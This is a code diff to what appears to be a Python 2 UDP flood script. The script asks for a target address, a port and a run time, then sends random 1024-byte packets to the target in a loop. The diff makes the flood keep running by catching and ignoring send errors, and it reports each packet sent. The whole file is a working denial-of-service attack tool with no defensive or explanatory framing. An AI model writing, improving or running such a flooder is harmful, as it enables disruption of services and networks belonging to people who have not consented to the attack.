@@ -10,16 +10,21 @@ bytes = random._urandom(1024) * int(sys.argv[1])
 def pres():
 	print credits
 pres()
-victim  = raw_input(' -+- Target: ')
+victim = raw_input(' -+- Target: ')
 vport = input(' -+- Port: ')
-duration  = input(' -+- Run: ')
-timeout =  time.time() + duration
+duration = input(' -+- Run: ')
+timeout = time.time() + duration
 sent = 0
 while 1:
 	if time.time() > timeout:
-		break
+		break		
 	else:
 		pass
+	try:
 		client.sendto(bytes, (victim, vport))
-		sent = sent + 1
-		print "%s Packets: %s Port: %s "%(sent, victim, vport)
+	except ValueError:
+		pass
+	except:
+		pass
+	sent = sent + 1
+	print "%s Packets: %s Port: %s "%(sent, victim, vport)
